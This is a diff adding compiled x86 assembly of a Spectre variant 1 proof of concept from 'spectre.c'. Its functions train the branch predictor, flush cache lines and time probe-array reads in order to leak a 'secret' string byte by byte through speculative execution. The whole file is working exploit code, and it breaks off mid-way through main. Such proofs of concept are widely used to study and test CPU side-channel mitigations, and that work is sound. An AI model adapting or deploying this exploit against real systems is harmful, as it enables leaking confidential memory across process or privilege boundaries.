@@ -1,0 +1,973 @@
+	.text
+	.intel_syntax noprefix
+	.file	"spectre.c"
+	.globl	check                           # -- Begin function check
+	.p2align	4, 0x90
+	.type	check,@function
+check:                                  # @check
+	.cfi_startproc
+# %bb.0:
+	xor	eax, eax
+	cmp	dword ptr [esp + 4], 16
+	setb	al
+	ret
+.Lfunc_end0:
+	.size	check, .Lfunc_end0-check
+	.cfi_endproc
+                                        # -- End function
+	.globl	victim_function                 # -- Begin function victim_function
+	.p2align	4, 0x90
+	.type	victim_function,@function
+victim_function:                        # @victim_function
+	.cfi_startproc
+# %bb.0:
+	call	.L1$pb
+	.cfi_adjust_cfa_offset 4
+.L1$pb:
+	pop	eax
+	.cfi_adjust_cfa_offset -4
+.Ltmp0:
+	add	eax, offset _GLOBAL_OFFSET_TABLE_+(.Ltmp0-.L1$pb)
+	mov	ecx, dword ptr [esp + 8]
+	cmp	dword ptr [ecx], 0
+	je	.LBB1_2
+# %bb.1:
+	mov	ecx, dword ptr [esp + 4]
+	movzx	ecx, byte ptr [eax + ecx + array1@GOTOFF]
+	shl	ecx, 9
+	mov	cl, byte ptr [eax + ecx + array2@GOTOFF]
+	and	byte ptr [eax + temp@GOTOFF], cl
+.LBB1_2:
+	ret
+.Lfunc_end1:
+	.size	victim_function, .Lfunc_end1-victim_function
+	.cfi_endproc
+                                        # -- End function
+	.globl	readMemoryByte                  # -- Begin function readMemoryByte
+	.p2align	4, 0x90
+	.type	readMemoryByte,@function
+readMemoryByte:                         # @readMemoryByte
+	.cfi_startproc
+# %bb.0:
+	push	ebp
+	.cfi_def_cfa_offset 8
+	push	ebx
+	.cfi_def_cfa_offset 12
+	push	edi
+	.cfi_def_cfa_offset 16
+	push	esi
+	.cfi_def_cfa_offset 20
+	sub	esp, 28
+	.cfi_def_cfa_offset 48
+	.cfi_offset esi, -20
+	.cfi_offset edi, -16
+	.cfi_offset ebx, -12
+	.cfi_offset ebp, -8
+	call	.L2$pb
+	.cfi_adjust_cfa_offset 4
+.L2$pb:
+	pop	ebx
+	.cfi_adjust_cfa_offset -4
+.Ltmp1:
+	add	ebx, offset _GLOBAL_OFFSET_TABLE_+(.Ltmp1-.L2$pb)
+	sub	esp, 4
+	.cfi_adjust_cfa_offset 4
+	lea	eax, [ebx + readMemoryByte.results@GOTOFF]
+	push	1024
+	.cfi_adjust_cfa_offset 4
+	push	0
+	.cfi_adjust_cfa_offset 4
+	push	eax
+	.cfi_adjust_cfa_offset 4
+	call	memset@PLT
+	add	esp, 16
+	.cfi_adjust_cfa_offset -16
+	mov	edx, 999
+	.p2align	4, 0x90
+.LBB2_1:                                # =>This Loop Header: Depth=1
+                                        #     Child Loop BB2_2 Depth 2
+                                        #     Child Loop BB2_4 Depth 2
+                                        #       Child Loop BB2_31 Depth 3
+                                        #     Child Loop BB2_9 Depth 2
+                                        #     Child Loop BB2_14 Depth 2
+	xor	eax, eax
+	.p2align	4, 0x90
+.LBB2_2:                                #   Parent Loop BB2_1 Depth=1
+                                        # =>  This Inner Loop Header: Depth=2
+	clflush	byte ptr [ebx + eax + array2@GOTOFF]
+	clflush	byte ptr [ebx + eax + array2@GOTOFF+512]
+	clflush	byte ptr [ebx + eax + array2@GOTOFF+1024]
+	clflush	byte ptr [ebx + eax + array2@GOTOFF+1536]
+	clflush	byte ptr [ebx + eax + array2@GOTOFF+2048]
+	clflush	byte ptr [ebx + eax + array2@GOTOFF+2560]
+	clflush	byte ptr [ebx + eax + array2@GOTOFF+3072]
+	clflush	byte ptr [ebx + eax + array2@GOTOFF+3584]
+	add	eax, 4096
+	cmp	eax, 131072
+	jne	.LBB2_2
+# %bb.3:                                #   in Loop: Header=BB2_1 Depth=1
+	mov	dword ptr [esp + 12], edx       # 4-byte Spill
+	mov	edi, edx
+	and	edi, 15
+	mov	eax, edi
+	mov	dword ptr [esp + 8], edi        # 4-byte Spill
+	xor	edi, dword ptr [esp + 48]
+	mov	esi, 29
+	jmp	.LBB2_4
+	.p2align	4, 0x90
+.LBB2_7:                                #   in Loop: Header=BB2_4 Depth=2
+	sub	esp, 8
+	.cfi_adjust_cfa_offset 8
+	lea	ecx, [ebx + x_is_safe_static@GOTOFF]
+	push	ecx
+	.cfi_adjust_cfa_offset 4
+	push	eax
+	.cfi_adjust_cfa_offset 4
+	call	victim_function
+	add	esp, 16
+	.cfi_adjust_cfa_offset -16
+	mov	dword ptr [ebx + x_is_safe_static@GOTOFF], 0
+	sub	esi, 1
+	jb	.LBB2_8
+.LBB2_4:                                #   Parent Loop BB2_1 Depth=1
+                                        # =>  This Loop Header: Depth=2
+                                        #       Child Loop BB2_31 Depth 3
+	mov	eax, esi
+	mov	ecx, -1431655765
+	mul	ecx
+	shr	edx
+	and	edx, -2
+	lea	eax, [edx + 2*edx]
+	not	eax
+	add	eax, esi
+	mov	ecx, eax
+	and	ecx, -65536
+	shr	eax, 16
+	or	eax, ecx
+	and	eax, edi
+	xor	eax, dword ptr [esp + 8]        # 4-byte Folded Reload
+	cmp	eax, 15
+	ja	.LBB2_6
+# %bb.5:                                #   in Loop: Header=BB2_4 Depth=2
+	mov	dword ptr [ebx + x_is_safe_static@GOTOFF], 1
+.LBB2_6:                                #   in Loop: Header=BB2_4 Depth=2
+	clflush	byte ptr [ebx + x_is_safe_static@GOTOFF]
+	mov	dword ptr [esp + 4], 0
+	mov	ecx, dword ptr [esp + 4]
+	cmp	ecx, 99
+	jg	.LBB2_7
+	.p2align	4, 0x90
+.LBB2_31:                               #   Parent Loop BB2_1 Depth=1
+                                        #     Parent Loop BB2_4 Depth=2
+                                        # =>    This Inner Loop Header: Depth=3
+	add	dword ptr [esp + 4], 1
+	mov	ecx, dword ptr [esp + 4]
+	cmp	ecx, 100
+	jl	.LBB2_31
+	jmp	.LBB2_7
+	.p2align	4, 0x90
+.LBB2_8:                                #   in Loop: Header=BB2_1 Depth=1
+	mov	ecx, 13
+	jmp	.LBB2_9
+	.p2align	4, 0x90
+.LBB2_12:                               #   in Loop: Header=BB2_9 Depth=2
+	add	ecx, 167
+	cmp	ecx, 42765
+	je	.LBB2_13
+.LBB2_9:                                #   Parent Loop BB2_1 Depth=1
+                                        # =>  This Inner Loop Header: Depth=2
+	mov	dword ptr [esp + 24], ecx       # 4-byte Spill
+	movzx	ebp, cl
+	mov	eax, ebp
+	mov	dword ptr [esp + 20], ebp       # 4-byte Spill
+	shl	ebp, 9
+	rdtscp
+	mov	esi, eax
+	mov	edi, edx
+	movzx	eax, byte ptr [ebx + ebp + array2@GOTOFF]
+	rdtscp
+	mov	dword ptr [esp + 16], ecx       # 4-byte Spill
+	sub	eax, esi
+	sbb	edx, edi
+	mov	ecx, 100
+	cmp	ecx, eax
+	mov	ecx, dword ptr [esp + 24]       # 4-byte Reload
+	mov	eax, 0
+	sbb	eax, edx
+	jb	.LBB2_12
+# %bb.10:                               #   in Loop: Header=BB2_9 Depth=2
+	mov	eax, dword ptr [esp + 8]        # 4-byte Reload
+	cmp	cl, byte ptr [ebx + eax + array1@GOTOFF]
+	je	.LBB2_12
+# %bb.11:                               #   in Loop: Header=BB2_9 Depth=2
+	mov	eax, dword ptr [esp + 20]       # 4-byte Reload
+	add	dword ptr [ebx + 4*eax + readMemoryByte.results@GOTOFF], 1
+	jmp	.LBB2_12
+	.p2align	4, 0x90
+.LBB2_13:                               #   in Loop: Header=BB2_1 Depth=1
+	mov	eax, -1
+	xor	esi, esi
+	lea	edi, [ebx + readMemoryByte.results@GOTOFF+4]
+	mov	ecx, -1
+	jmp	.LBB2_14
+	.p2align	4, 0x90
+.LBB2_21:                               #   in Loop: Header=BB2_14 Depth=2
+	mov	ecx, eax
+	mov	eax, ebp
+.LBB2_26:                               #   in Loop: Header=BB2_14 Depth=2
+	add	esi, 2
+	add	edi, 8
+	cmp	esi, 256
+	je	.LBB2_27
+.LBB2_14:                               #   Parent Loop BB2_1 Depth=1
+                                        # =>  This Inner Loop Header: Depth=2
+	test	eax, eax
+	js	.LBB2_15
+# %bb.16:                               #   in Loop: Header=BB2_14 Depth=2
+	mov	edx, dword ptr [edi - 4]
+	cmp	edx, dword ptr [ebx + 4*eax + readMemoryByte.results@GOTOFF]
+	jge	.LBB2_15
+# %bb.17:                               #   in Loop: Header=BB2_14 Depth=2
+	test	ecx, ecx
+	js	.LBB2_19
+# %bb.18:                               #   in Loop: Header=BB2_14 Depth=2
+	cmp	edx, dword ptr [ebx + 4*ecx + readMemoryByte.results@GOTOFF]
+	jl	.LBB2_20
+.LBB2_19:                               #   in Loop: Header=BB2_14 Depth=2
+	mov	ecx, esi
+.LBB2_20:                               #   in Loop: Header=BB2_14 Depth=2
+	lea	ebp, [esi + 1]
+	test	eax, eax
+	jns	.LBB2_22
+	jmp	.LBB2_21
+	.p2align	4, 0x90
+.LBB2_15:                               #   in Loop: Header=BB2_14 Depth=2
+	mov	ecx, eax
+	mov	eax, esi
+	lea	ebp, [esi + 1]
+	test	eax, eax
+	js	.LBB2_21
+.LBB2_22:                               #   in Loop: Header=BB2_14 Depth=2
+	mov	edx, dword ptr [edi]
+	cmp	edx, dword ptr [ebx + 4*eax + readMemoryByte.results@GOTOFF]
+	jge	.LBB2_21
+# %bb.23:                               #   in Loop: Header=BB2_14 Depth=2
+	test	ecx, ecx
+	js	.LBB2_25
+# %bb.24:                               #   in Loop: Header=BB2_14 Depth=2
+	cmp	edx, dword ptr [ebx + 4*ecx + readMemoryByte.results@GOTOFF]
+	jl	.LBB2_26
+.LBB2_25:                               #   in Loop: Header=BB2_14 Depth=2
+	mov	ecx, ebp
+	jmp	.LBB2_26
+	.p2align	4, 0x90
+.LBB2_27:                               #   in Loop: Header=BB2_1 Depth=1
+	mov	esi, dword ptr [ebx + 4*eax + readMemoryByte.results@GOTOFF]
+	mov	edi, dword ptr [ebx + 4*ecx + readMemoryByte.results@GOTOFF]
+	lea	edx, [edi + edi]
+	add	edx, 5
+	cmp	esi, edx
+	mov	edx, dword ptr [esp + 12]       # 4-byte Reload
+	jge	.LBB2_30
+# %bb.28:                               #   in Loop: Header=BB2_1 Depth=1
+	xor	esi, 2
+	or	esi, edi
+	je	.LBB2_30
+# %bb.29:                               #   in Loop: Header=BB2_1 Depth=1
+	mov	esi, edx
+	add	edx, -1
+	cmp	esi, 1
+	ja	.LBB2_1
+.LBB2_30:
+	mov	edx, dword ptr [esp + 16]       # 4-byte Reload
+	xor	dword ptr [ebx + readMemoryByte.results@GOTOFF], edx
+	mov	esi, dword ptr [esp + 52]
+	mov	byte ptr [esi], al
+	mov	eax, dword ptr [ebx + 4*eax + readMemoryByte.results@GOTOFF]
+	mov	edx, dword ptr [esp + 56]
+	mov	dword ptr [edx], eax
+	mov	byte ptr [esi + 1], cl
+	mov	eax, dword ptr [ebx + 4*ecx + readMemoryByte.results@GOTOFF]
+	mov	dword ptr [edx + 4], eax
+	add	esp, 28
+	.cfi_def_cfa_offset 20
+	pop	esi
+	.cfi_def_cfa_offset 16
+	pop	edi
+	.cfi_def_cfa_offset 12
+	pop	ebx
+	.cfi_def_cfa_offset 8
+	pop	ebp
+	.cfi_def_cfa_offset 4
+	ret
+.Lfunc_end2:
+	.size	readMemoryByte, .Lfunc_end2-readMemoryByte
+	.cfi_endproc
+                                        # -- End function
+	.globl	main                            # -- Begin function main
+	.p2align	4, 0x90
+	.type	main,@function
+main:                                   # @main
+	.cfi_startproc
+# %bb.0:
+	push	ebp
+	.cfi_def_cfa_offset 8
+	push	ebx
+	.cfi_def_cfa_offset 12
+	push	edi
+	.cfi_def_cfa_offset 16
+	push	esi
+	.cfi_def_cfa_offset 20
+	sub	esp, 76
+	.cfi_def_cfa_offset 96
+	.cfi_offset esi, -20
+	.cfi_offset edi, -16
+	.cfi_offset ebx, -12
+	.cfi_offset ebp, -8
+	call	.L3$pb
+	.cfi_adjust_cfa_offset 4
+.L3$pb:
+	pop	ebx
+	.cfi_adjust_cfa_offset -4
+.Ltmp2:
+	add	ebx, offset _GLOBAL_OFFSET_TABLE_+(.Ltmp2-.L3$pb)
+	mov	esi, dword ptr [ebx + stdin@GOT]
+	lea	eax, [ebx + check@GOTOFF]
+	mov	dword ptr [esp + 52], eax       # 4-byte Spill
+	lea	eax, [ebx + .L.str.13@GOTOFF]
+	mov	dword ptr [esp + 48], eax       # 4-byte Spill
+	lea	eax, [ebx + .L.str.1@GOTOFF]
+	mov	dword ptr [esp + 44], eax       # 4-byte Spill
+	lea	eax, [ebx + array1@GOTOFF]
+	mov	dword ptr [esp + 32], eax       # 4-byte Spill
+	lea	eax, [ebx + array2@GOTOFF]
+	mov	dword ptr [esp + 40], eax       # 4-byte Spill
+	lea	eax, [ebx + .L.str.2@GOTOFF]
+	mov	dword ptr [esp + 36], eax       # 4-byte Spill
+	mov	ebp, -1431655765
+	mov	dword ptr [esp + 56], esi       # 4-byte Spill
+	jmp	.LBB3_1
+	.p2align	4, 0x90
+.LBB3_42:                               #   in Loop: Header=BB3_1 Depth=1
+	call	getpid@PLT
+	xor	ecx, ecx
+	mov	edx, dword ptr [esp + 52]       # 4-byte Reload
+	add	edx, 33
+	setb	cl
+	push	eax
+	.cfi_adjust_cfa_offset 4
+	push	ecx
+	.cfi_adjust_cfa_offset 4
+	push	edx
+	.cfi_adjust_cfa_offset 4
+	push	dword ptr [esp + 60]            # 4-byte Folded Reload
+	.cfi_adjust_cfa_offset 4
+	call	printf@PLT
+	add	esp, 16
+	.cfi_adjust_cfa_offset -16
+.LBB3_1:                                # =>This Loop Header: Depth=1
+                                        #     Child Loop BB3_8 Depth 2
+                                        #       Child Loop BB3_9 Depth 3
+                                        #         Child Loop BB3_10 Depth 4
+                                        #         Child Loop BB3_12 Depth 4
+                                        #           Child Loop BB3_44 Depth 5
+                                        #         Child Loop BB3_17 Depth 4
+                                        #         Child Loop BB3_22 Depth 4
+	sub	esp, 12
+	.cfi_adjust_cfa_offset 12
+	push	dword ptr [esi]
+	.cfi_adjust_cfa_offset 4
+	call	getc@PLT
+	add	esp, 16
+	.cfi_adjust_cfa_offset -16
+	shl	eax, 24
+	cmp	eax, 167772160
+	je	.LBB3_1
+# %bb.2:                                #   in Loop: Header=BB3_1 Depth=1
+	cmp	eax, 1761607680
+	je	.LBB3_42
+# %bb.3:                                #   in Loop: Header=BB3_1 Depth=1
+	cmp	eax, 1912602624
+	jne	.LBB3_43
+# %bb.4:                                #   in Loop: Header=BB3_1 Depth=1
+	mov	eax, dword ptr [ebx + secret@GOTOFF]
+	sub	esp, 4
+	.cfi_adjust_cfa_offset 4
+	push	eax
+	.cfi_adjust_cfa_offset 4
+	push	eax
+	.cfi_adjust_cfa_offset 4
+	push	dword ptr [esp + 56]            # 4-byte Folded Reload
+	.cfi_adjust_cfa_offset 4
+	call	printf@PLT
+	add	esp, 16
+	.cfi_adjust_cfa_offset -16
+	mov	eax, dword ptr [ebx + secret@GOTOFF]
+	mov	ecx, eax
+	sub	ecx, dword ptr [esp + 32]       # 4-byte Folded Reload
+	mov	dword ptr [esp + 24], ecx
+	sub	esp, 12
+	.cfi_adjust_cfa_offset 12
+	push	eax
+	.cfi_adjust_cfa_offset 4
+	call	strlen@PLT
+	add	esp, 16
+	.cfi_adjust_cfa_offset -16
+	mov	esi, eax
+	mov	dword ptr [esp + 16], eax
+	sub	esp, 4
+	.cfi_adjust_cfa_offset 4
+	push	131072
+	.cfi_adjust_cfa_offset 4
+	push	1
+	.cfi_adjust_cfa_offset 4
+	push	dword ptr [esp + 52]            # 4-byte Folded Reload
+	.cfi_adjust_cfa_offset 4
+	call	memset@PLT
+	add	esp, 16
+	.cfi_adjust_cfa_offset -16
+	cmp	dword ptr [esp + 96], 3
+	jne	.LBB3_6
+# %bb.5:                                #   in Loop: Header=BB3_1 Depth=1
+	sub	esp, 4
+	.cfi_adjust_cfa_offset 4
+	lea	eax, [esp + 28]
+	push	eax
+	.cfi_adjust_cfa_offset 4
+	push	dword ptr [esp + 44]            # 4-byte Folded Reload
+	.cfi_adjust_cfa_offset 4
+	mov	esi, dword ptr [esp + 112]
+	push	dword ptr [esi + 4]
+	.cfi_adjust_cfa_offset 4
+	call	__isoc99_sscanf@PLT
+	add	esp, 16
+	.cfi_adjust_cfa_offset -16
+	mov	eax, dword ptr [esp + 32]       # 4-byte Reload
+	sub	dword ptr [esp + 24], eax
+	sub	esp, 4
+	.cfi_adjust_cfa_offset 4
+	lea	eax, [ebx + .L.str.3@GOTOFF]
+	lea	ecx, [esp + 20]
+	push	ecx
+	.cfi_adjust_cfa_offset 4
+	push	eax
+	.cfi_adjust_cfa_offset 4
+	push	dword ptr [esi + 8]
+	.cfi_adjust_cfa_offset 4
+	call	__isoc99_sscanf@PLT
+	add	esp, 12
+	.cfi_adjust_cfa_offset -12
+	lea	eax, [ebx + .L.str.4@GOTOFF]
+	push	dword ptr [esp + 20]
+	.cfi_adjust_cfa_offset 4
+	push	dword ptr [esp + 32]
+	.cfi_adjust_cfa_offset 4
+	push	eax
+	.cfi_adjust_cfa_offset 4
+	call	printf@PLT
+	add	esp, 16
+	.cfi_adjust_cfa_offset -16
+	mov	esi, dword ptr [esp + 16]
+.LBB3_6:                                #   in Loop: Header=BB3_1 Depth=1
+	sub	esp, 8
+	.cfi_adjust_cfa_offset 8
+	lea	eax, [ebx + .L.str.5@GOTOFF]
+	push	esi
+	.cfi_adjust_cfa_offset 4
+	push	eax
+	.cfi_adjust_cfa_offset 4
+	call	printf@PLT
+	add	esp, 16
+	.cfi_adjust_cfa_offset -16
+	mov	eax, dword ptr [esp + 16]
+	lea	ecx, [eax - 1]
+	mov	dword ptr [esp + 16], ecx
+	test	eax, eax
+	jle	.LBB3_41
+# %bb.7:                                #   in Loop: Header=BB3_1 Depth=1
+	xor	esi, esi
+	jmp	.LBB3_8
+	.p2align	4, 0x90
+.LBB3_40:                               #   in Loop: Header=BB3_8 Depth=2
+	sub	esp, 12
+	.cfi_adjust_cfa_offset 12
+	push	10
+	.cfi_adjust_cfa_offset 4
+	call	putchar@PLT
+	add	esp, 16
+	.cfi_adjust_cfa_offset -16
+	mov	eax, dword ptr [esp + 16]
+	lea	ecx, [eax - 1]
+	mov	dword ptr [esp + 16], ecx
+	test	eax, eax
+	mov	esi, dword ptr [esp + 60]       # 4-byte Reload
+	jle	.LBB3_41
+.LBB3_8:                                #   Parent Loop BB3_1 Depth=1
+                                        # =>  This Loop Header: Depth=2
+                                        #       Child Loop BB3_9 Depth 3
+                                        #         Child Loop BB3_10 Depth 4
+                                        #         Child Loop BB3_12 Depth 4
+                                        #           Child Loop BB3_44 Depth 5
+                                        #         Child Loop BB3_17 Depth 4
+                                        #         Child Loop BB3_22 Depth 4
+	mov	eax, dword ptr [ebx + secret@GOTOFF]
+	movsx	eax, byte ptr [eax + esi]
+	sub	esp, 4
+	.cfi_adjust_cfa_offset 4
+	lea	ecx, [ebx + .L.str.6@GOTOFF]
+	push	eax
+	.cfi_adjust_cfa_offset 4
+	push	dword ptr [esp + 32]
+	.cfi_adjust_cfa_offset 4
+	push	ecx
+	.cfi_adjust_cfa_offset 4
+	call	printf@PLT
+	add	esp, 16
+	.cfi_adjust_cfa_offset -16
+	add	esi, 1
+	mov	dword ptr [esp + 60], esi       # 4-byte Spill
+	mov	eax, dword ptr [esp + 24]
+	mov	dword ptr [esp + 64], eax       # 4-byte Spill
+	add	eax, 1
+	mov	dword ptr [esp + 24], eax
+	sub	esp, 4
+	.cfi_adjust_cfa_offset 4
+	lea	eax, [ebx + readMemoryByte.results@GOTOFF]
+	push	1024
+	.cfi_adjust_cfa_offset 4
+	push	0
+	.cfi_adjust_cfa_offset 4
+	push	eax
+	.cfi_adjust_cfa_offset 4
+	call	memset@PLT
+	add	esp, 16
+	.cfi_adjust_cfa_offset -16
+	mov	edx, 999
+	.p2align	4, 0x90
+.LBB3_9:                                #   Parent Loop BB3_1 Depth=1
+                                        #     Parent Loop BB3_8 Depth=2
+                                        # =>    This Loop Header: Depth=3
+                                        #         Child Loop BB3_10 Depth 4
+                                        #         Child Loop BB3_12 Depth 4
+                                        #           Child Loop BB3_44 Depth 5
+                                        #         Child Loop BB3_17 Depth 4
+                                        #         Child Loop BB3_22 Depth 4
+	xor	eax, eax
+	.p2align	4, 0x90
+.LBB3_10:                               #   Parent Loop BB3_1 Depth=1
+                                        #     Parent Loop BB3_8 Depth=2
+                                        #       Parent Loop BB3_9 Depth=3
+                                        # =>      This Inner Loop Header: Depth=4
+	clflush	byte ptr [ebx + eax + array2@GOTOFF]
+	clflush	byte ptr [ebx + eax + array2@GOTOFF+512]
+	clflush	byte ptr [ebx + eax + array2@GOTOFF+1024]
+	clflush	byte ptr [ebx + eax + array2@GOTOFF+1536]
+	clflush	byte ptr [ebx + eax + array2@GOTOFF+2048]
+	clflush	byte ptr [ebx + eax + array2@GOTOFF+2560]
+	clflush	byte ptr [ebx + eax + array2@GOTOFF+3072]
+	clflush	byte ptr [ebx + eax + array2@GOTOFF+3584]
+	add	eax, 4096
+	cmp	eax, 131072
+	jne	.LBB3_10
+# %bb.11:                               #   in Loop: Header=BB3_9 Depth=3
+	mov	dword ptr [esp + 68], edx       # 4-byte Spill
+	mov	edi, edx
+	and	edi, 15
+	mov	eax, edi
+	mov	dword ptr [esp + 20], edi       # 4-byte Spill
+	xor	edi, dword ptr [esp + 64]       # 4-byte Folded Reload
+	mov	esi, 29
+	jmp	.LBB3_12
+	.p2align	4, 0x90
+.LBB3_15:                               #   in Loop: Header=BB3_12 Depth=4
+	sub	esp, 8
+	.cfi_adjust_cfa_offset 8
+	lea	ecx, [ebx + x_is_safe_static@GOTOFF]
+	push	ecx
+	.cfi_adjust_cfa_offset 4
+	push	eax
+	.cfi_adjust_cfa_offset 4
+	call	victim_function
+	add	esp, 16
+	.cfi_adjust_cfa_offset -16
+	mov	dword ptr [ebx + x_is_safe_static@GOTOFF], 0
+	sub	esi, 1
+	jb	.LBB3_16
+.LBB3_12:                               #   Parent Loop BB3_1 Depth=1
+                                        #     Parent Loop BB3_8 Depth=2
+                                        #       Parent Loop BB3_9 Depth=3
+                                        # =>      This Loop Header: Depth=4
+                                        #           Child Loop BB3_44 Depth 5
+	mov	eax, esi
+	mul	ebp
+	shr	edx
+	and	edx, -2
+	lea	eax, [edx + 2*edx]
+	not	eax
+	add	eax, esi
+	mov	ecx, eax
+	and	ecx, -65536
+	shr	eax, 16
+	or	eax, ecx
+	and	eax, edi
+	xor	eax, dword ptr [esp + 20]       # 4-byte Folded Reload
+	cmp	eax, 15
+	ja	.LBB3_14
+# %bb.13:                               #   in Loop: Header=BB3_12 Depth=4
+	mov	dword ptr [ebx + x_is_safe_static@GOTOFF], 1
+.LBB3_14:                               #   in Loop: Header=BB3_12 Depth=4
+	clflush	byte ptr [ebx + x_is_safe_static@GOTOFF]
+	mov	dword ptr [esp + 28], 0
+	mov	ecx, dword ptr [esp + 28]
+	cmp	ecx, 99
+	jg	.LBB3_15
+	.p2align	4, 0x90
+.LBB3_44:                               #   Parent Loop BB3_1 Depth=1
+                                        #     Parent Loop BB3_8 Depth=2
+                                        #       Parent Loop BB3_9 Depth=3
+                                        #         Parent Loop BB3_12 Depth=4
+                                        # =>        This Inner Loop Header: Depth=5
+	add	dword ptr [esp + 28], 1
+	mov	ecx, dword ptr [esp + 28]
+	cmp	ecx, 100
+	jl	.LBB3_44
+	jmp	.LBB3_15
+	.p2align	4, 0x90
+.LBB3_16:                               #   in Loop: Header=BB3_9 Depth=3
+	mov	edx, 13
+	jmp	.LBB3_17
+	.p2align	4, 0x90
+.LBB3_20:                               #   in Loop: Header=BB3_17 Depth=4
+	add	edx, 167
+	cmp	edx, 42765
+	je	.LBB3_21
+.LBB3_17:                               #   Parent Loop BB3_1 Depth=1
+                                        #     Parent Loop BB3_8 Depth=2
+                                        #       Parent Loop BB3_9 Depth=3
+                                        # =>      This Inner Loop Header: Depth=4
+	mov	dword ptr [esp + 12], edx       # 4-byte Spill
+	movzx	ebp, dl
+	mov	eax, ebp
+	mov	dword ptr [esp + 72], ebp       # 4-byte Spill
+	shl	ebp, 9
+	rdtscp
+	mov	esi, eax
+	mov	edi, edx
+	movzx	eax, byte ptr [ebx + ebp + array2@GOTOFF]
+	rdtscp
+	sub	eax, esi
+	sbb	edx, edi
+	mov	esi, 100
+	cmp	esi, eax
+	mov	eax, 0
+	sbb	eax, edx
+	mov	edx, dword ptr [esp + 12]       # 4-byte Reload
+	jb	.LBB3_20
+# %bb.18:                               #   in Loop: Header=BB3_17 Depth=4
+	mov	eax, dword ptr [esp + 20]       # 4-byte Reload
+	cmp	dl, byte ptr [ebx + eax + array1@GOTOFF]
+	je	.LBB3_20
+# %bb.19:                               #   in Loop: Header=BB3_17 Depth=4
+	mov	eax, dword ptr [esp + 72]       # 4-byte Reload
+	add	dword ptr [ebx + 4*eax + readMemoryByte.results@GOTOFF], 1
+	jmp	.LBB3_20
+	.p2align	4, 0x90
+.LBB3_21:                               #   in Loop: Header=BB3_9 Depth=3
+	mov	dword ptr [esp + 20], ecx       # 4-byte Spill
+	mov	ecx, -1
+	xor	eax, eax
+	lea	edx, [ebx + readMemoryByte.results@GOTOFF+4]
+	mov	dword ptr [esp + 12], -1        # 4-byte Folded Spill
+	jmp	.LBB3_22
+	.p2align	4, 0x90
+.LBB3_29:                               #   in Loop: Header=BB3_22 Depth=4
+	mov	dword ptr [esp + 12], ecx       # 4-byte Spill
+	mov	ecx, esi
+.LBB3_34:                               #   in Loop: Header=BB3_22 Depth=4
+	add	eax, 2
+	add	edx, 8
+	cmp	eax, 256
+	je	.LBB3_35
+.LBB3_22:                               #   Parent Loop BB3_1 Depth=1
+                                        #     Parent Loop BB3_8 Depth=2
+                                        #       Parent Loop BB3_9 Depth=3
+                                        # =>      This Inner Loop Header: Depth=4
+	mov	edi, ecx
+	test	ecx, ecx
+	js	.LBB3_23
+# %bb.24:                               #   in Loop: Header=BB3_22 Depth=4
+	mov	esi, dword ptr [edx - 4]
+	cmp	esi, dword ptr [ebx + 4*edi + readMemoryByte.results@GOTOFF]
+	jge	.LBB3_23
+# %bb.25:                               #   in Loop: Header=BB3_22 Depth=4
+	mov	edi, dword ptr [esp + 12]       # 4-byte Reload
+	test	edi, edi
+	js	.LBB3_27
+# %bb.26:                               #   in Loop: Header=BB3_22 Depth=4
+	cmp	esi, dword ptr [ebx + 4*edi + readMemoryByte.results@GOTOFF]
+	jl	.LBB3_28
+.LBB3_27:                               #   in Loop: Header=BB3_22 Depth=4
+	mov	dword ptr [esp + 12], eax       # 4-byte Spill
+.LBB3_28:                               #   in Loop: Header=BB3_22 Depth=4
+	lea	esi, [eax + 1]
+	test	ecx, ecx
+	jns	.LBB3_30
+	jmp	.LBB3_29
+	.p2align	4, 0x90
+.LBB3_23:                               #   in Loop: Header=BB3_22 Depth=4
+	mov	dword ptr [esp + 12], edi       # 4-byte Spill
+	mov	ecx, eax
+	lea	esi, [eax + 1]
+	test	ecx, ecx
+	js	.LBB3_29
+.LBB3_30:                               #   in Loop: Header=BB3_22 Depth=4
+	mov	edi, dword ptr [edx]
+	cmp	edi, dword ptr [ebx + 4*ecx + readMemoryByte.results@GOTOFF]
+	jge	.LBB3_29
+# %bb.31:                               #   in Loop: Header=BB3_22 Depth=4
+	mov	ebp, dword ptr [esp + 12]       # 4-byte Reload
+	test	ebp, ebp
+	js	.LBB3_33
+# %bb.32:                               #   in Loop: Header=BB3_22 Depth=4
+	cmp	edi, dword ptr [ebx + 4*ebp + readMemoryByte.results@GOTOFF]
+	jl	.LBB3_34
+.LBB3_33:                               #   in Loop: Header=BB3_22 Depth=4
+	mov	dword ptr [esp + 12], esi       # 4-byte Spill
+	jmp	.LBB3_34
+	.p2align	4, 0x90
+.LBB3_35:                               #   in Loop: Header=BB3_9 Depth=3
+	mov	eax, ecx
+	mov	eax, dword ptr [ebx + 4*ecx + readMemoryByte.results@GOTOFF]
+	mov	edx, dword ptr [esp + 12]       # 4-byte Reload
+	mov	edx, dword ptr [ebx + 4*edx + readMemoryByte.results@GOTOFF]
+	lea	esi, [edx + edx]
+	add	esi, 5
+	cmp	eax, esi
+	mov	ebp, -1431655765
+	mov	esi, dword ptr [esp + 68]       # 4-byte Reload
+	jge	.LBB3_38
+# %bb.36:                               #   in Loop: Header=BB3_9 Depth=3
+	xor	eax, 2
+	or	eax, edx
+	je	.LBB3_38
+# %bb.37:                               #   in Loop: Header=BB3_9 Depth=3
+	lea	edx, [esi - 1]
+	cmp	esi, 1
+	ja	.LBB3_9
+.LBB3_38:                               #   in Loop: Header=BB3_8 Depth=2
+	mov	eax, dword ptr [esp + 20]       # 4-byte Reload
+	xor	dword ptr [ebx + readMemoryByte.results@GOTOFF], eax
+	mov	edi, ecx
+	mov	ecx, dword ptr [ebx + 4*ecx + readMemoryByte.results@GOTOFF]
+	mov	dword ptr [esp + 20], ecx       # 4-byte Spill
+	mov	eax, dword ptr [esp + 12]       # 4-byte Reload
+	mov	esi, dword ptr [ebx + 4*eax + readMemoryByte.results@GOTOFF]
+	lea	eax, [esi + esi]
+	cmp	ecx, eax
+	lea	eax, [ebx + .L.str.9@GOTOFF]
+	lea	ecx, [ebx + .L.str.8@GOTOFF]
+	cmovl	ecx, eax
+	sub	esp, 8
+	.cfi_adjust_cfa_offset 8
+	lea	eax, [ebx + .L.str.7@GOTOFF]
+	push	ecx
+	.cfi_adjust_cfa_offset 4
+	push	eax
+	.cfi_adjust_cfa_offset 4
+	call	printf@PLT
+	add	esp, 16
+	.cfi_adjust_cfa_offset -16
+	mov	ecx, edi
+	movzx	eax, cl
+	add	cl, -32
+	cmp	cl, 95
+	mov	ecx, 63
+	cmovb	ecx, eax
+	lea	edx, [ebx + .L.str.10@GOTOFF]
+	push	dword ptr [esp + 20]            # 4-byte Folded Reload
